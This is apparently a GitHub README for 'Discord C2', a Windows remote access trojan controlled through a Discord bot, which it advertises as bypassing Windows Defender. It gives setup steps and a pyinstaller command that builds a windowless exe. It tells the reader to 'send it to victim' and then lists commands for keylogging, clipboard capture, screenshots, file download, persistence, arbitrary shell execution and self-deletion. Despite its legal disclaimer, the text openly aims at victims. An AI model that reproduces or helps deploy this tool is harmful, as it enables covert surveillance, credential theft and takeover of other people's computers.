# 🕹️ Discord C2 – Remote Access Tool For Windows that Bypass Windows Defender.

**Discord C2** is a remote administration tool (RAT) that uses Discord as its command & control (C2) channel. It allows an authorized operator to control multiple target machines through a single Discord channel. The bot supports file system operations, process management, keylogging, screenshots, persistence, and system shell execution.

> **⚠️ Legal Notice**  
> This tool is intended **only** for authorized security testing, educational research, and helping system administrators manage their own infrastructure with explicit written permission.  
> Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.

---

# Commands
**Discord C2 Commands (@Huzaifa818)** 

#Setup Discord server and Bot:

**Download discord app in microsoft store**

# Step1 Setup server:

login to Discord and make Server:

<img width="1905" height="834" alt="Screenshot 2026-05-08 145434" src="https://github.com/user-attachments/assets/41c47762-3878-4243-904d-cbb1d79ec565" />


<img width="1903" height="810" alt="Screenshot 2026-05-08 145524" src="https://github.com/user-attachments/assets/09d72932-c22f-4a53-aac3-8dd1d84e2769" />


<img width="714" height="694" alt="Screenshot 2026-05-08 145604" src="https://github.com/user-attachments/assets/76237c6b-d548-4485-9eea-b0af9995a409" />



# Step2 setup Bot:

Go to website of discord:

https://discord.com/developers/applications


# Step3 Create new bot:


<img width="1902" height="840" alt="Screenshot 2026-05-08 150240" src="https://github.com/user-attachments/assets/29433cab-32bb-488d-baf4-e3453ffd29de" />


<img width="1060" height="687" alt="Screenshot 2026-05-08 150332" src="https://github.com/user-attachments/assets/32b51349-5861-40dc-8305-a3f16a0354d7" />


# Step4 click your bot:


<img width="1906" height="817" alt="Screenshot 2026-05-08 150509" src="https://github.com/user-attachments/assets/2eeb7ea4-e6fc-4d25-9258-38723e8b1914" />


<img width="1909" height="823" alt="Screenshot 2026-05-08 150718" src="https://github.com/user-attachments/assets/b332bf95-98a8-41be-86f7-ecae142d4c7b" />


<img width="1906" height="822" alt="Screenshot 2026-05-08 150821" src="https://github.com/user-attachments/assets/55e7236b-6bb9-4299-9d16-1893747fba3a" />


<img width="1905" height="802" alt="Screenshot 2026-05-08 150930" src="https://github.com/user-attachments/assets/b9a08bbb-a9bf-4169-9274-865d4f257008" />


<img width="1909" height="832" alt="Screenshot 2026-05-08 151138" src="https://github.com/user-attachments/assets/c915a93a-81d5-4dbe-b22e-17092a6942c0" />


<img width="1905" height="823" alt="Screenshot 2026-05-08 151223" src="https://github.com/user-attachments/assets/93b0fe43-972c-4cd5-b692-09c660995df9" />


<img width="1909" height="829" alt="Screenshot 2026-05-08 151336" src="https://github.com/user-attachments/assets/c251b6bc-a2a6-478e-96a5-90ea3c20621f" />


<img width="1912" height="820" alt="Screenshot 2026-05-08 151621" src="https://github.com/user-attachments/assets/b1ce1f6b-9fdd-4f2d-81f5-ccb72fc94601" />


<img width="1912" height="826" alt="Screenshot 2026-05-08 151655" src="https://github.com/user-attachments/assets/8fff3a6e-febc-4b48-b8a9-efd7ce410c94" />


<img width="404" height="278" alt="Screenshot 2026-05-08 151826" src="https://github.com/user-attachments/assets/5838bd57-fc04-4e7f-a007-a44f4a9dd2c0" />


# Step5 Download Discord app and login:


<img width="1912" height="1000" alt="Screenshot 2026-05-08 151938" src="https://github.com/user-attachments/assets/0b0ac23b-ca6e-47a7-9d63-bfecfe6ac06d" />


<img width="1918" height="1006" alt="Screenshot 2026-05-08 152139" src="https://github.com/user-attachments/assets/a4f2674a-6bda-45f8-ae3b-64342311f45f" />



# ✅ How to Use 

1- Clone the repo:
`git clone https://github.com/huzaifa818/Discord-c2.git `

#Install dependencies:

**Using Window 10/11 to make exe:**

#Install Requirement:

1- Install python latest and set in Environment variable
**Download latest Version of python and set it in Envirment Variable**

# Open terminal in Same folder where you download zip:

Check python:

`python --verion`

 `pip install discord.py pyautogui pynput pyperclip psutil pillow opencv-python`

 `pip install pyinstaller` Must be for making exe

# CONFIG THESE IN discord_c2.py

BOT_TOKEN = "your_bot_token_here"          # Discord bot token

CHANNEL_ID = 123456789012345678            # integer, channel ID where bot listens

ALLOWED_USER_IDS = [987654321098765432]    # your Discord user ID(s)

# COMPILE IT INTO AN EXE BY USING PYINSTALLER And send it to victim:

Command = ` pyinstaller --noconsole --onefile --icon=Icon1.ico discord_c2.py `

-----------------------------After formed exe send it to victum---------------------------



**In your Discord channel:**

!list – see all online machines (their IDs). (First step)

!select PC1_John – choose which machine to control. (Second step)

Then use !shell whoami, !screenshot, etc. – commands affect the selected machine.

Persistence – run !persist on each machine once. It will survive reboots.

Self destruct – !self_destruct deletes the executable from the target. 

**Session Management**  
`!list` – Show all connected implants  
`!select <id>` – Choose active implant  
`!exec <id> <cmd>` – Run command on specific implant  

**Other**  
`!persist` – Install persistence  
`!keylog_start/stop/dump`  
`!clip` – Clipboard  
`!screenshot`  
`!ps`, `!kill`  
`!sysinfo`  
`!self_destruct`  
`!shell <command>` – Raw command  
`!ping` – Latency  
"""

**Filesystem**  
`!pwd` – Show current directory  
`!cd <path>` – Change directory  
`!ls [path]` – List directory contents  
`!tree [path]` – Directory tree  
`!rm <file>` – Delete file  
`!rmdir <dir>` – Delete directory  

**File Transfer**  
`!download <path>` – Download file from victim  
`!upload` – Attach file to upload to victim  

**Persistence**  
`!persist` – Install startup persistence  

**Keylogger**  
`!keylog_start` – Start keylogger  
`!keylog_stop` – Stop  
`!keylog_dump` – Retrieve keystrokes  

**Clipboard**  
`!clip` – Get current clipboard text  

**Screenshot**  
`!screenshot` – Capture screen  

**Processes**  
`!ps` – List processes  
`!kill <pid|name>` – Terminate process  

**System**  
`!sysinfo` – Show system information  

**Self‑destruct**  
`!self_destruct` – Delete executable  

**Raw command**  
`!shell <command>` – Execute any shell command  

**Utility**  
`!ping` – Check latency 
